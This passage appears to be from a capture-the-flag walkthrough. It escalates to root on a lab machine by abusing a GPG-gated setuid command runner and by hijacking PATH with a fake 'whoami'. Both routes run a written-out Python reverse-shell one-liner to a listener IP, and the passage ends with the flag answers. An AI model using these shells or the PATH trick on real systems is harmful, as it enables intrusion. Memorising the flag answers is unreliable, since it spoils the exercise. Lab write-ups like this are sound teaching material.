It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y
harder:~$ ls                
read_flag      read_flag.gpg  user.txt

harder:~$ /usr/local/bin/execute-crypted read_flag.gpg
gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
      "Administrator <root@harder.local>"
harder:~$ ls
read_flag      read_flag.gpg  root.txt       user.txt
harder:~$ cat root.txt 
3a7bd72672889e0756b09f0566935a6c

revshell

harder:~$ vi revshell
harder:~$ cat revshell
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.8.19.103",4445));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'

harder:~$ gpg -er root revshell
gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user

sub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>
 Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y
harder:~$ /usr/local/bin/execute-crypted revshell.gpg
gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
      "Administrator <root@harder.local>"

┌──(witty㉿kali)-[~/Downloads]
└─$ nc -lnvp 4445                                           
listening on [any] 4445 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.30.41] 44728
harder:/home/evs# id      
id
uid=0(root) gid=1000(evs) groups=1000(evs)
harder:/home/evs# cd /root 
cd /root
harder:~# ls       
ls
root.txt

another way

harder:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
harder:~$ cd /tmp
harder:/tmp$ export PATH=/tmp:$PATH
harder:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

echo -n "[*] Current User: ";
    whoami;
    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
    echo "[-] Create a file like this: echo -n whoami > command"
    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"

harder:/tmp$ vi whoami
harder:/tmp$ cat whoami 
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.8.19.103",4445));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'

harder:/tmp$ /usr/local/bin/execute-crypted
[*] Current User: root
[-] This program runs only commands which are encypted for root@harder.local using gpg.
[-] Create a file like this: echo -n whoami > command
[-] Encrypt the file and run the command: execute-crypted command.gpg
harder:/tmp$ ls
client_temp                      sess_4se9himrrv161rk7jfvmm8cnjt
fastcgi_temp                     sess_utu0095om9rr89vk98njrm2t2t
proxy_temp_path                  uwsgi_temp
scgi_temp                        whoami
harder:/tmp$ chmod 777 whoami
harder:/tmp$ /usr/local/bin/execute-crypted

┌──(witty㉿kali)-[~/Downloads]
└─$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.30.41] 44774
harder:/tmp# id       
id
uid=0(root) gid=1000(evs) groups=1000(evs)

```

Hack the machine and obtain the user Flag (user.txt)

*7e88bf11a579dc5ed66cc798cbe49f76*

Escalate your privileges and get the root Flag (root.txt)

*3a7bd72672889e0756b09f0566935a6c*

[[Cooctus Stories]]